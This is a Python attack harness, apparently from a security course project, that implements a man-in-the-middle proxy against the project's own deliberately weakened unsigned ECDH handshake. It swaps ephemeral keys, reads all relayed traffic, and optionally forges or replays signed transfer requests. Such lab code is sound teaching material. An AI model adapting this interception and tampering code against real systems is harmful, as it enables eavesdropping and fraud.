"""Attack harness (Member 2: A1 proxy). Mandatory attacks: A1 (here) and A5 (Milestone 2).

A1 - unsigned handshake, man-in-the-middle on port 6000:

    python -m treasury.server --weak unsigned-handshake
    python -m treasury.mallory --attack A1 --weak unsigned-handshake [--tamper modify|replay]
    python -m treasury.member --name M1 --port 6000 --weak unsigned-handshake

Mallory has no certificate of her own. She forwards the real certificates but
replaces both ephemeral keys (X -> X', Y -> Y'), so she ends up with one ECDH
secret shared with the member and another shared with the server. She then
relays between the two encrypted channels and reads every message (registration,
login, signed requests).

What A1 does NOT break, by design:
  * certificates are still checked, so Mallory cannot claim a different identity;
  * AES-GCM still protects each hop (Mallory simply owns both hop keys);
  * signed requests are still verified: ``--tamper modify`` changes the request
    body and the server rejects the ECDSA signature; ``--tamper replay`` resends
    an accepted request and the server rejects the old sequence number.

Against the secure (signed) handshake the same proxy fails immediately: the
member verifies the server's signature over (X, Y') and rejects it.

The scripted end-to-end demonstration is ``python -m attacks.a1_unsigned_handshake``.
"""
import argparse
import copy
import json
import socket
import sys
import threading

from .channel import ChannelError, SecureChannel, recv_secure, send_secure
from .config import HOST, MALLORY_PORT, SERVER_PORT, SOCKET_TIMEOUT_SECONDS, WEAKNESS_NAMES, validate_group
from .framing import ProtocolError, recv_json, send_json
from .handshake import ecdh, generate_ephemeral
from .logging_utils import get_logger

TAMPER_MODES = ("none", "modify", "replay")


def _short(value: str, n: int = 8) -> str:
    return value[:n] + "..." if isinstance(value, str) and len(value) > n else str(value)


def describe(message) -> str:
    """One-line summary of an intercepted plaintext message, for the attack log."""
    if not isinstance(message, dict):
        return repr(message)
    kind = message.get("type")
    if kind == "request":
        req = message.get("request", {})
        return (f"SIGNED REQUEST name={req.get('name')} seq={req.get('seq')} op={req.get('op')} "
                f"body={json.dumps(req.get('body'), sort_keys=True)} sig={_short(req.get('sig'), 12)}")
    shown = {k: (_short(v, 16) if isinstance(v, str) and len(v) > 24 else v) for k, v in message.items()}
    return json.dumps(shown, sort_keys=True)


def tamper_request(message: dict) -> dict:
    """Change the signed body (keeping the original signature)."""
    forged = copy.deepcopy(message)
    body = forged["request"]["body"]
    if isinstance(body.get("amount"), (int, float)):
        body["amount"] = body["amount"] * 100
    else:
        body["mallory"] = "was here"
    body["reason"] = "transfer to Mallory"
    return forged


class Interception:
    """One proxied member connection: two handshakes, then a lock-step relay."""

    def __init__(self, member_sock, server_sock, log, tamper: str = "none"):
        self.member_sock, self.server_sock = member_sock, server_sock
        self.log, self.tamper = log, tamper
        self.name = "?"
        self.seen: list[dict] = []          # every plaintext message Mallory read
        self.request_results: list[dict] = []
        self.handshake_failed: str | None = None
        self.done = threading.Event()

    # -- step 1: substitute both ephemeral keys ------------------------------------
    def intercept_handshake(self) -> tuple[SecureChannel, SecureChannel] | None:
        hello = recv_json(self.member_sock)
        if not isinstance(hello, dict) or hello.get("type") != "hs-hello":
            raise ProtocolError("expected hs-hello from the member")
        self.name = hello.get("cert", {}).get("name", "?")
        X = hello["X"]
        m1, X_fake = generate_ephemeral()           # Mallory <-> server
        self.log.info("[A1] %s -> server  hs-hello: replaced X=%s... with X'=%s...",
                      self.name, X[2:10], X_fake[2:10])
        send_json(self.server_sock, {**hello, "X": X_fake})

        reply = recv_json(self.server_sock)
        if not isinstance(reply, dict) or reply.get("type") != "hs-server":
            self.handshake_failed = f"server answered {describe(reply)}"
            if reply is not None:
                send_json(self.member_sock, reply)
            return None
        Y = reply["Y"]
        m2, Y_fake = generate_ephemeral()           # Mallory <-> member
        self.log.info("[A1] server -> %s  hs-server: replaced Y=%s... with Y'=%s...%s",
                      self.name, Y[2:10], Y_fake[2:10],
                      " (server SIGNED it - forwarding the signature anyway)" if "sig" in reply else "")
        send_json(self.member_sock, {**reply, "Y": Y_fake})

        finish = recv_json(self.member_sock)
        if not isinstance(finish, dict) or finish.get("type") != "hs-member":
            self.handshake_failed = f"member answered {describe(finish)}"
            if finish is not None:
                send_json(self.server_sock, finish)
            return None
        send_json(self.server_sock, finish)
        ok = recv_json(self.server_sock)
        if ok is not None:
            send_json(self.member_sock, ok)
        if not isinstance(ok, dict) or ok.get("type") != "hs-ok":
            self.handshake_failed = f"server answered {describe(ok)}"
            return None

        # Two independent sessions, each looking legitimate to its endpoint.
        to_member = SecureChannel.for_server(ecdh(m2, X), self.name, X, Y_fake)
        to_server = SecureChannel.for_member(ecdh(m1, Y), self.name, X_fake, Y)
        self.log.info("[A1] MITM established for %s: Mallory holds both channel keys", self.name)
        return to_member, to_server

    # -- step 2: relay, read and optionally tamper -----------------------------------
    def relay(self, to_member: SecureChannel, to_server: SecureChannel) -> None:
        while True:
            message = recv_secure(self.member_sock, to_member)
            if message is None:
                return
            self.seen.append(message)
            self.log.info("[A1] READ %s -> server: %s", self.name, describe(message))

            if message.get("type") == "request" and self.tamper == "modify":
                forged = tamper_request(message)
                self.log.warning("[A1] TAMPER: forwarding modified body %s with the ORIGINAL signature",
                                 json.dumps(forged["request"]["body"], sort_keys=True))
                message = forged
            send_secure(self.server_sock, to_server, message)
            if message.get("type") == "bye":
                return

            reply = recv_secure(self.server_sock, to_server)
            if reply is None:
                self.log.info("[A1] server closed the connection")
                return
            self.seen.append(reply)
            self.log.info("[A1] READ server -> %s: %s", self.name, describe(reply))
            if reply.get("type") == "request-result":
                self.request_results.append(reply)
            send_secure(self.member_sock, to_member, reply)

            if (message.get("type") == "request" and self.tamper == "replay"
                    and reply.get("ok")):
                self.log.warning("[A1] REPLAY: re-sending the accepted request seq=%s",
                                 message["request"]["seq"])
                send_secure(self.server_sock, to_server, message)
                replayed = recv_secure(self.server_sock, to_server)
                self.log.info("[A1] server answer to replay: %s", describe(replayed))
                if isinstance(replayed, dict):
                    self.request_results.append({**replayed, "replay": True})
                return

    def run(self) -> None:
        try:
            channels = self.intercept_handshake()
            if channels is None:
                self.log.warning("[A1] attack FAILED for %s: handshake rejected (%s)",
                                 self.name, self.handshake_failed)
                return
            self.relay(*channels)
        except (ChannelError, ProtocolError, ConnectionError, socket.timeout, OSError) as exc:
            self.log.info("[A1] connection for %s ended: %s", self.name, exc)
        finally:
            for sock in (self.member_sock, self.server_sock):
                try:
                    sock.close()
                except OSError:
                    pass
            self.done.set()


class MalloryProxy:
    """Listens like the server (port 6000) and intercepts each member connection."""

    def __init__(self, log, listen_host: str = HOST, listen_port: int = MALLORY_PORT,
                 server_host: str = HOST, server_port: int = SERVER_PORT, tamper: str = "none"):
        self.log = log
        self.listen_host, self.listen_port = listen_host, listen_port
        self.server_host, self.server_port = server_host, server_port
        self.tamper = tamper
        self.interceptions: list[Interception] = []
        self._listener = None
        self._stopping = threading.Event()

    def bind(self) -> int:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.listen_host, self.listen_port))
        listener.listen()
        listener.settimeout(0.5)
        self._listener = listener
        self.listen_port = listener.getsockname()[1]
        self.log.info("Mallory listening on %s:%d, relaying to %s:%d (tamper=%s)",
                      self.listen_host, self.listen_port, self.server_host, self.server_port,
                      self.tamper)
        return self.listen_port

    def handle(self, member_sock: socket.socket) -> Interception:
        member_sock.settimeout(SOCKET_TIMEOUT_SECONDS)
        server_sock = socket.create_connection((self.server_host, self.server_port),
                                               timeout=SOCKET_TIMEOUT_SECONDS)
        interception = Interception(member_sock, server_sock, self.log, self.tamper)
        self.interceptions.append(interception)
        interception.run()
        return interception

    def serve_forever(self) -> None:
        if self._listener is None:
            self.bind()
        try:
            while not self._stopping.is_set():
                try:
                    conn, _ = self._listener.accept()
                except socket.timeout:
                    continue
                threading.Thread(target=self.handle, args=(conn,), daemon=True).start()
        finally:
            self._listener.close()

    def start_background(self) -> threading.Thread:
        self.bind()
        thread = threading.Thread(target=self.serve_forever, daemon=True)
        thread.start()
        return thread

    def stop(self) -> None:
        self._stopping.set()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Treasury attack harness")
    parser.add_argument("--attack", required=True,
                        choices=["A1", "A2", "A3", "A4", "A5", "A6", "A7"])
    parser.add_argument("--weak", required=True, choices=sorted(WEAKNESS_NAMES))
    parser.add_argument("--listen-port", type=int, default=MALLORY_PORT)
    parser.add_argument("--server-host", default=HOST)
    parser.add_argument("--server-port", type=int, default=SERVER_PORT)
    parser.add_argument("--tamper", choices=TAMPER_MODES, default="none",
                        help="A1: modify or replay a relayed signed request")
    args = parser.parse_args(argv)
    validate_group()
    if args.attack == "A1" and args.weak != "unsigned-handshake":
        parser.error("A1 uses --weak unsigned-handshake")
    log = get_logger("mallory")
    log.info("selected %s using weakness %s", args.attack, args.weak)

    if args.attack == "A1":
        proxy = MalloryProxy(log, HOST, args.listen_port, args.server_host, args.server_port,
                             tamper=args.tamper)
        try:
            proxy.serve_forever()
        except KeyboardInterrupt:
            log.info("Mallory stopped")
        return 0
    if args.attack == "A3":
        log.info("A3 is a standalone demo: python -m attacks.a3_short_challenge")
        return 0
    log.info("%s is not implemented in Milestone 1 (A5 arrives with Milestone 2)", args.attack)
    return 1


if __name__ == "__main__":
    sys.exit(main())
